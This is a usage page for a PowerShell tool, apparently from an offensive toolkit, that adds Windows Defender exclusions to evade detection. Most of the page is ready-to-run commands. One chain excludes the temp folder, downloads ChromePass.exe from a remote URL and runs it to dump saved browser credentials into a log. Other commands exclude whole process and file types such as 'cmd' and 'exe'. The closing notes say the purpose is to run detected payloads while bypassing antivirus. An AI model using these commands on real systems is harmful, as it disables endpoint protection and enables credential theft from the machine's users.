## Invoke-Exclusions.ps1

|Cmdlet name|Description|Privileges|Notes|
|---|---|---|---|
|[Invoke-Exclusions](https://github.com/r00t-3xp10it/redpill/blob/main/lib/WD-Bypass/Invoke-Exclusions.ps1)|Add exclusions to Defender (Set-MpPreference) + Download\Execute -uri 'cmdlet'<br />Exclusion values accepted : **'ExclusionPath, ExclusionProcess, ExclusionExtension'**|Administrator|[Screenshot1](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.png)<br />[Screenshot2](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-ExclusionsUrl.png)|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
```

<br />

**prerequesites checks:**
```powershell
#Make sure Windows Defender service its running
[bool](Get-Service -Name "WinDefend")

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

#Make sure required modules are present\loaded
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Get-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference")
```

```powershell
#Get full module information
Get-help .\Invoke-Exclusions.ps1 -Force

#Get Exclusions List (terminal)
.\Invoke-Exclusions.ps1 -action "query"

#Get Exclusions List (GUI)
.\Invoke-Exclusions.ps1 -action "query" -Gui "true"


#Set-MpPreference -ExclusionProcess "cmd" -Force
.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionProcess" -Exclude "cmd"

#Set-MpPreference -ExclusionExtension "exe" -Force
.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionExtension" -Exclude "exe"

#Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionPath" -Exclude "$Env:TMP"


## Add exclusion Path + Download URI PE + Execute PE
# 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -OutFile "$Env:TMP\ChromePass.exe"
# 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"


#Remove-MpPreference -ExclusionProcess "cmd" Force
.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionProcess" -Exclude "cmd"
```

<br />

### Final Notes
```powershell
[DESCRIPTION]
This cmdlet allow users to manage ( query, create, delete ) Windows
Defender exclusions: ExclusionExtension, ExclusionProcess, ExclusionPath.
The files covered by the exclusion definition will be excluded from Windows
Defender Real-time protection, monitoring, Scheduled scans, On-demand scans.

[NOTES]
This cmdlet in addition to add\remove exclusions from windows defender
allows its users to download binaries (PE) that are being detected by the
anti-virus and run it through the exclusion definition (bypassing detection)
Use a comma (,) to split multiple exclusion entrys ( -exclude 'exe,vbs' )

[Parameter URI limitations]
This function creates the exclusion on Defender then downloads the -uri 'script\PE'
to -exclude 'directory' and finally executes the script.ps1 OR the binary (PE) from
the exclusion directory with the intent to evade detection ( download + execution )

But 'execution' of payloads under -uri invocation is advised to be only under
-type parameter 'ExclusionPath', because is exclusion is more comprehensive
```
